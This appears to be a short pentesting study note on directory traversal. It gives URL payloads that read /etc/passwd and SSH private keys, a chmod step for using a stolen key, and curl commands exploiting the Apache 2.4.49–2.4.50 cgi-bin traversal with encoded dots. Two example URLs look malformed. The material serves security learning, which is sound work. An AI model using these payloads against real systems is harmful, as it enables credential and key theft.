# Identifying and Exploiting Directory Traversals

A url may look like:

```
https://vulnerable-website/index.php?page=admin.php
```

Here the parameter `page` looks to be loading a file.

maybe we can do:

```
https://vulnerable-website/index.php=../../../../../../../../etc/passwd
```

if so maybe we can read an ssh key

```
https://vulnerable-website/index.php=../../../../../../../../home/harry/.ssh/id_rsa
```

OR `../../../../../../../../home/harry/.ssh/id_ecdsa`

use curl or burp suite or view-source to see how it is formatted properly.

NB: Also if you copy and paste an ssh private key into a file on the local linux system called `harry_id_rsa`, you need to 

```
kali@kali:~$ chmod 600 harry_id_rsa
```

# Encoding Special Characters

Apache 2.4.49-2.4.50 have a directory traversal bug in the `cgi-bin` path.

```
kali@kali:~$ curl http://vulnerable-website/cgi-bin/../../../../etc/passwd
```

won't work! but when encoded as `%2e` as a `.` 

```
kali@kali:~$ curl http://vulnerable-website/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

WORKS!
